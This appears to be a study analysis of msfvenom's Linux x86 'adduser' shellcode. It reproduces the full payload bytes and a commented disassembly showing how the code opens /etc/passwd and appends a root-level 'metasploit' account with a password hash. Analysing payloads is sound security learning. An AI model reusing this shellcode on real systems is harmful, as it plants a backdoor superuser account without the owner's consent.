;Using following command to create our shellcode for analysis:
;//msfvenom linux/x86/adduser -f c

;unsigned char buf[] = 
;"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
;"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
;"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x6d\x65"
;"\x74\x61\x73\x70\x6c\x6f\x69\x74\x3a\x41\x7a\x2f\x64\x49\x73"
;"\x6a\x34\x70\x34\x49\x52\x63\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a"
;"\x2f\x62\x69\x6e\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58"
;"\xcd\x80\x6a\x01\x58\xcd\x80";

   xor    ecx,ecx	
   mov    ebx,ecx
   push   0x46			;preparing setgid syscall {setgid (%ebx)}
   pop    eax
   int    0x80			;setgid to the process will run with group id of the file
   push   0x5			;preparing open syscall	{open (%ebx , %ecx , %edx )}
   pop    eax
   xor    ecx,ecx
   push   ecx			;pushing null to /etc/passwd
   push   0x64777373	;pushing /etc/passwd
   push   0x61702f2f
   push   0x6374652f
   mov    ebx,esp
   inc    ecx			;increments ecx [0] by one for the next instruction to make it 0x401
   mov    ch,0x4		;open syscall flags
   int    0x80			;opens /etc/passwd
   xchg   ebx,eax
   call   0xbfffef31
   ins    DWORD PTR es:[edi],dx ;the next set of instructions represent [metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh] but gdb's disassembler understand it as instructions rather than a string

   pop    ecx		       ;get "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh" from stack and stores it in ecx
   mov    edx,DWORD PTR [ecx-0x4] ;get length of "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh" and stores it in edx which is [40]
   push   0x4		       ;preparing write syscall {write (%ebx , %ecx , %edx )}
   pop    eax
   int    0x80 		       ;writes "metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh" into opened file /etc/passwd with length of [40]
   push   0x1	;preparing exit syscall  {_exit (%ebx)}
   pop    eax
   int    0x80	;exits gracefuly
